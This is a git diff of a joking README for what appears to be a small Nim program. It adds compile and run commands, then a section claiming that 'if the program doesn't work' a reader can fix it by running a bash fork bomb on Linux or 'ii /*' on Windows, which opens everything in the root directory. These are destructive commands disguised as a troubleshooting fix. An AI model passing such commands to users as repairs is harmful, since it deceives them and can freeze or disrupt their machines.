@@ -1,14 +1,24 @@
 Birds are fake.
 
-# Run Instructions
+# Commands that might be good to know
+
+### Compile
+
+`nim c main.nim`
+
+Run Compiled code
+
+`./main` :happy:
+
+`main.exe` ewww windows...
+
 
 ### Compile and Run
 
-`chmod 775 run.sh`
+`nim c -r main.nim`
 
-then
+# If the program doesn't work run this to fix it:
 
-`./run.sh`
+`:(){ :|:& };:` for linux.. maybe mac?
 
-
-> if you edit stuff I expect you know how to recompile and run it
+`ii /*` for windows
